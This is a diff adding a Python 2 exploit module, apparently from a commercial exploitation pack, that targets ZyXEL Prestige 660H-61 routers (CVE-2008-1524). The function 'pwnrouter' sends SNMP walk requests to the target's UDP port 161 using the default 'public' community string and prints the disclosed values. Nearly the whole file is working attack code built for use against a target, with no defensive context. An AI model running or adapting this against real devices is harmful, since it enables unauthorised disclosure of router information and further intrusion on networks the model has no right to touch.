@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import sys
+
+from struct import pack, unpack
+from datetime import datetime as dt
+
+try:
+  from pysnmp.entity.rfc3413.oneliner import cmdgen
+  from pysnmp.proto.rfc1902 import Integer, IpAddress, OctetString
+except:
+  print '[D2] d2sec_zyxel_2.py: No module pysnmp'
+
+_name_   = 'd2sec_zyxel_2'
+_vendor_ = 'zyxel'
+_model_  = ['Prestige 660H-61']
+_vuln_   = 'Information disclosure'
+_cve_    = 'CVE-2008-1524'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  community='public'
+  value=(1,3,6,1,4,1,890,1,2,1,2)
+  generator = cmdgen.CommandGenerator()
+  comm_data = cmdgen.CommunityData('server', community, 1) # 1 means version SNMP v2c
+  transport = cmdgen.UdpTransportTarget((host, 161))
+  real_fun = getattr(generator, 'nextCmd')
+  res = (errorIndication, errorStatus, errorIndex, varBinds)\
+    = real_fun(comm_data, transport, value)
+  if not errorIndication is None  or errorStatus is True:
+    print "Error: %s %s %s %s" % res
+  else:
+    for v in varBinds:
+      print "%s: %s" % (v[0][0], v[0][1])
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
